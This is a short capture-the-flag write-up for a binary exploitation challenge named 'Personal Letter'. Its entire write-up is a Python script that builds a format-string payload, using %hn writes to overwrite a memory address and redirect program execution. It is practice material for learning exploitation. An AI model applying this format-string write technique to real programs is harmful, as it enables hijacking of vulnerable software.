# Personal Letter

**Category:** Binary Exploitation
**Points:** 160
**Description:**


> Have you ever gotten tired of writing your name in the header of a letter? Well now there's a program (source)to do it for you! Navigate to /problems/letter/ on the shell server to try your exploit out!

## Write-up

```python
import struct
number = 0x804872b
addr = 0x0804a02c

towritel = (number & 0xFFFF)
towriteh = ((number & 0xFFFF0000)>>16)

payload = ""
payload += struct.pack('<I',addr)
payload +=  struct.pack('<I',addr+2)
payload += "%{}x|%26$hn".format(towritel-17)
payload += "%{}x|%27$hn".format(towriteh-towritel-433)
print payload

```


